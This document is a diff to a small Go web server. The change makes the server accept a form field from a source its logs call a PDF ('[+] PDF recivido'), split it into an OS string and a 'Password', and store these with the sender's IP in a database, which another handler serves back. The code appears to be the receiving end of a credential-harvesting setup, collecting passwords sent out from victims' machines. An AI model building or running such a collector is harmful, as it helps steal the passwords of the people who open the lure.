@@ -6,6 +6,7 @@ import (
 
 
 	"net"
+        "strings"
 	"net/http"
 	"encoding/json"
 
@@ -13,6 +14,7 @@ import (
 )
 
 func HealthCheckHandler(w http.ResponseWriter, r *http.Request) {
+    log.Println("- GET - /")
     // A very simple health check.
     w.Header().Set("Content-Type", "application/json")
     w.WriteHeader(http.StatusOK)
@@ -26,22 +28,29 @@ func HealthCheckHandler(w http.ResponseWriter, r *http.Request) {
 
 func reciveInfo(w http.ResponseWriter, r *http.Request) {
 	var datos data.DataReceived
-	err := json.NewDecoder(r.Body).Decode(&datos)
-
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusBadRequest)
-		return
-	}
+        r.ParseForm()
+        s := strings.Split(r.Form["x"][0],"&")
 
 	ip, _, err := net.SplitHostPort(r.RemoteAddr)
+        if err != nil {
+            log.Println("error")
+        }
+
+
 	datos.IP = ip
+        datos.SO = s[0]
+        datos.Password = s[1]
+        //datos.INFO = s[1]
+
+        log.Println("[+] PDF recivido *** ", ip)
+        log.Println(s[0])
 
 	data.Init()
 	data.AddData(datos)
 	defer data.DB.Close()
 
 	w.Header().Set("Content-Type", "application/json")
-    w.WriteHeader(http.StatusOK)
+        w.WriteHeader(http.StatusOK)
 	io.WriteString(w, "Added")
 }
 
@@ -55,4 +64,8 @@ func giveInfo(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
     w.WriteHeader(http.StatusOK)
 	w.Write(ready)
+}
+
+func test(w http.ResponseWriter, r *http.Request) {
+    log.Println( r.Body )
 }
